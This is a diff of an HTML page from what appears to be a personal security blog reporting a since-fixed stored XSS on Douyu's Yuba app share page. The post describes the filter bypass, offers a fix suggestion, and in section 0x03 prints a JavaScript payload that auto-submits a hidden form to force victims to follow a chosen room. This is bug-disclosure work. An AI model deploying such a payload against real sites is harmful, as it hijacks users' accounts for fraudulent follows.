@@ -6,21 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  看了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
+    <meta name="description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  刷了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
 <meta property="og:type" content="article">
 <meta property="og:title" content="斗鱼某处存储型XSS(附Bypass过程)">
 <meta property="og:url" content="http://yoursite.com/2018/12/07/斗鱼某处存储型XSS(附Bypass过程)/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  看了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
+<meta property="og:description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  刷了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544084508153696.png">
 <meta property="og:image" content="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544084611686009.png">
 <meta property="og:image" content="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544085571559018.png">
 <meta property="og:image" content="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544085992896489.png">
-<meta property="og:updated_time" content="2018-12-07T16:45:04.000Z">
+<meta property="og:updated_time" content="2018-12-07T16:49:53.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="斗鱼某处存储型XSS(附Bypass过程)">
-<meta name="twitter:description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  看了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
+<meta name="twitter:description" content="(已修复)    一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -  刷了这么久直播，终于能关顾下斗鱼的src了…泪奔!! 简要描述:虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。 0x01 点击进入：https://yuba.douyu.com/homepage/ma">
 <meta name="twitter:image" content="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544084508153696.png">
     
     
@@ -105,8 +105,8 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#已修复"><span class="toc-number">1.</span> <span class="toc-text">(已修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简要描述"><span class="toc-number">2.</span> <span class="toc-text">简要描述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-点击进入："><span class="toc-number">3.</span> <span class="toc-text">0x01 点击进入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-点击分享"><span class="toc-number">4.</span> <span class="toc-text">0x02 点击分享</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#注：-多了个m-也就是m引发的血案-。"><span class="toc-number"></span> <span class="toc-text">注： (多了个m)   也就是m引发的血案 。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-关于利用"><span class="toc-number">1.</span> <span class="toc-text">0x03 关于利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-修复建议"><span class="toc-number">2.</span> <span class="toc-text">0x04 修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">3.</span> <span class="toc-text">总结：</span></a></li></ol>
-    </li></div>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#已修复"><span class="toc-number">1.</span> <span class="toc-text">(已修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简要描述"><span class="toc-number">2.</span> <span class="toc-text">简要描述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-点击进入："><span class="toc-number">3.</span> <span class="toc-text">0x01 点击进入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-点击分享"><span class="toc-number">4.</span> <span class="toc-text">0x02 点击分享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-关于利用"><span class="toc-number">5.</span> <span class="toc-text">0x03 关于利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-修复建议"><span class="toc-number">6.</span> <span class="toc-text">0x04 修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">7.</span> <span class="toc-text">总结：</span></a></li></ol>
+    </div>
   </span>
 </div>
 
@@ -144,7 +144,7 @@
     <h2 id="已修复"><a href="#已修复" class="headerlink" title="(已修复)"></a>(已修复)</h2><blockquote>
 <p>   一次非常有意思的fuzzing过程，故做个简单的xsser记录，感谢55开的火箭。给老铁点点关注（我卢本伟没有开挂）- . -</p>
 </blockquote>
-<p>看了这么久直播，终于能关顾下斗鱼的src了…泪奔!!</p>
+<p>刷了这么久直播，终于能关顾下斗鱼的src了…泪奔!!</p>
 <h2 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述:"></a>简要描述:</h2><p>虽然在PC分享页面过滤掉的非常完美，还有WAF的鼎力支持，但是还是疏忽了app端的分享页面的过滤。</p>
 <h2 id="0x01-点击进入："><a href="#0x01-点击进入：" class="headerlink" title="0x01 点击进入："></a>0x01 点击进入：</h2><p><code>https://yuba.douyu.com/homepage/main</code></p>
 <p>简单的发布一条带图片的动态吧，用Burp抓取post包：</p>
@@ -155,8 +155,8 @@
 <h2 id="0x02-点击分享"><a href="#0x02-点击分享" class="headerlink" title="0x02 点击分享"></a>0x02 点击分享</h2><p>点击分享，得到以下链接：<br><code>https://yuba.douyu.com/wb/1065528069613203737</code></p>
 <p>发现PC端完全过滤的明明白白的了：<br><img src="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544085571559018.png" alt=""></p>
 <p>但是从手机app里分享出来的链接是 完全没有做任何过滤的。</p>
-<p><code>https://yubam.douyu.com/wb/1065528069613203737</code></p>
-<h1 id="注：-多了个m-也就是m引发的血案-。"><a href="#注：-多了个m-也就是m引发的血案-。" class="headerlink" title="注： (多了个m)   也就是m引发的血案 。"></a>注： (多了个m)   也就是m引发的血案 。</h1><p> <img src="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544085992896489.png" alt=""></p>
+<p><code>https://yubam.douyu.com/wb/1065528069613203737</code><br>  注： (多了个m)   也就是m引发的血案 。</p>
+<p> <img src="https://security.douyu.com/Public/ueditor/php/upload/Temp/20181206/1544085992896489.png" alt=""></p>
 <h2 id="0x03-关于利用"><a href="#0x03-关于利用" class="headerlink" title="0x03 关于利用"></a>0x03 关于利用</h2><p>如果拿着斗鱼的XSS去薅羊毛，美滋滋，毕竟水友那么多，这里简单的举个例子： (任意刷关注 ，订阅….等)，这也是最吃香的地方。</p>
 <figure class="highlight plain"><figcaption><span>new_form()&#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    var f = document.createElement(&quot;form&quot;);</span><br><span class="line">    document.body.appendChild(f);</span><br><span class="line">    f.method = &quot;post&quot;;</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br><span class="line">function create_elements(eForm, eName, eValue)&#123;</span><br><span class="line">    var e = document.createElement(&quot;input&quot;);</span><br><span class="line">    eForm.appendChild(e);</span><br><span class="line">    e.type = &apos;text&apos;;</span><br><span class="line">    e.name = eName;</span><br><span class="line">    if(!document.all)&#123;e.style.display = &apos;none&apos;;&#125;else&#123;</span><br><span class="line">        e.style.display = &apos;block&apos;;</span><br><span class="line">        e.style.width = &apos;0px&apos;;</span><br><span class="line">        e.style.height = &apos;0px&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    e.value = eValue;</span><br><span class="line">    return e;</span><br><span class="line">&#125;</span><br><span class="line">var _f = new_form();</span><br><span class="line">create_elements(_f, &quot;room_id&quot;, &quot;5395900&quot;);</span><br><span class="line">_f.action= &quot;https://www.douyu.com/room/follow/add_confuse/&quot;;</span><br><span class="line">_f.submit();</span><br></pre></td></tr></table></figure>
 <h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p> 继续过滤手机分享页面的输出，关靠防火墙是防不住了。 </p>
@@ -187,8 +187,8 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#已修复"><span class="toc-number">1.</span> <span class="toc-text">(已修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简要描述"><span class="toc-number">2.</span> <span class="toc-text">简要描述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-点击进入："><span class="toc-number">3.</span> <span class="toc-text">0x01 点击进入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-点击分享"><span class="toc-number">4.</span> <span class="toc-text">0x02 点击分享</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#注：-多了个m-也就是m引发的血案-。"><span class="toc-number"></span> <span class="toc-text">注： (多了个m)   也就是m引发的血案 。</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-关于利用"><span class="toc-number">1.</span> <span class="toc-text">0x03 关于利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-修复建议"><span class="toc-number">2.</span> <span class="toc-text">0x04 修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">3.</span> <span class="toc-text">总结：</span></a></li></ol>
-    </li></div>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#已修复"><span class="toc-number">1.</span> <span class="toc-text">(已修复)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简要描述"><span class="toc-number">2.</span> <span class="toc-text">简要描述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-点击进入："><span class="toc-number">3.</span> <span class="toc-text">0x01 点击进入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-点击分享"><span class="toc-number">4.</span> <span class="toc-text">0x02 点击分享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-关于利用"><span class="toc-number">5.</span> <span class="toc-text">0x03 关于利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-修复建议"><span class="toc-number">6.</span> <span class="toc-text">0x04 修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-number">7.</span> <span class="toc-text">总结：</span></a></li></ol>
+    </div>
 
     <div id="share-footer" style="display: none">
       <ul>
